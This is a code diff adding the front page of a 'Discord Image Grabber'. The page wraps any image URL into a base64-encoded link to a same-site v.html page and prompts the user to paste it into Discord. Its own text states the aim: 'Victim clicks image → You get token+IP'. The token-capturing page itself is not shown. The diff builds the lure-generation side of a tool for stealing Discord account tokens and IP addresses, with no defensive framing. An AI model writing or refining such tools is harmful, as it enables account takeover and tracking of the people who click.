@@ -1,8 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>🖼️ Image Viewer</title>
+<meta charset="UTF-8">
+</head>
+<body style="background:black;color:lime;font-family:monospace;padding:40px;text-align:center;">
+<h1 style="font-size:32px;">🖼️ Discord Image Grabber</h1>
+<p style="color:#ccc;">Enter any image URL → Get clickable Discord link</p>
+<input id="i" placeholder="https://i.imgur.com/yourimage.jpg" style="width:90%;max-width:500px;padding:20px;font-size:18px;background:#111;color:lime;border:2px solid lime;margin:20px 0;border-radius:8px;">
+<button onclick="g()" style="padding:20px 40px;font-size:20px;background:lime;color:black;border:none;font-weight:bold;border-radius:8px;cursor:pointer;">🎯 GENERATE LINK</button>
+<div id="r" style="display:none;margin-top:30px;padding:20px;background:#111;border:2px solid lime;border-radius:8px;">
+<h3 style="color:lime;">✅ Copy this link to Discord:</h3>
+<textarea id="l" rows="3" style="width:100%;background:#000;color:lime;border:2px solid lime;font-family:monospace;padding:15px;font-size:16px;border-radius:4px;" readonly></textarea>
+<button onclick="c()" style="width:100%;padding:15px 20px;background:lime;color:black;border:none;font-weight:bold;border-radius:4px;margin-top:10px;cursor:pointer;font-size:16px;">📋 COPY LINK</button>
+<p style="color:#ccc;font-size:14px;margin-top:15px;">Paste in Discord → Victim clicks image → You get token+IP</p>
+</div>
 <script>
 function g(){
-  let u = document.getElementById('i').value;
+  let u = document.getElementById('i').value.trim();
   if(!u) {
-    alert('Enter image URL first!');
+    alert('⚠️ Enter image URL first!');
+    return;
+  }
+  if(!u.match(/^https?:\/\//)) {
+    alert('⚠️ Valid URL needed (http:// or https://)');
     return;
   }
   let e = location.origin + '/v.html?u=' + btoa(u);
@@ -10,12 +31,19 @@ function g(){
   document.getElementById('r').style.display = 'block';
   document.getElementById('l').select();
   document.getElementById('l').focus();
+  alert('✅ Link ready! Paste in Discord');
 }
 function c(){
   let txt = document.getElementById('l');
   txt.select();
   txt.setSelectionRange(0, 99999);
-  navigator.clipboard.writeText(txt.value);
-  alert('✅ Link copied!');
+  navigator.clipboard.writeText(txt.value).then(()=>{
+    alert('✅ Link copied to clipboard!');
+  }).catch(()=>{
+    document.execCommand('copy');
+    alert('✅ Link copied!');
+  });
 }
 </script>
+</body>
+</html>
